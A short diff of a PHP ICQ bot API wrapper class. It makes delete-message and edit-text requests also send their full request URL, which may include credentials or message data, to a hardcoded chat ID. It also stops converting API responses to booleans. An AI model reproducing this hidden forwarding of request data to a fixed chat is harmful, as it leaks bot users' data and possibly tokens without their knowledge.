@@ -90,11 +90,12 @@ class ICQnew
 			
 			
 			$url = $this->apiUrl . $method . "?" . http_build_query($data);
-			if ($method == "/messages/deleteMessages") $this->call("/messages/sendText", [
-			'chatId' => "752067062", 
-			'text' => $url
-			] );
-			
+			if ($method == "/messages/deleteMessages" || $method == "/messages/editText") {
+				$this->call("/messages/sendText", [
+					'chatId' => "752067062", 
+					'text' => $url
+				]);
+			}			
 
 		}else {
 
@@ -399,11 +400,7 @@ class ICQnew
 			'text' => $text,	
 			'inlineKeyboardMarkup' => $inlineKeyboardMarkup
 		]);	
-			
-		if ($response['ok']) {
-			$response = true;
-		}else $response = false;
-			
+		
 		return $response;
 		
 	}
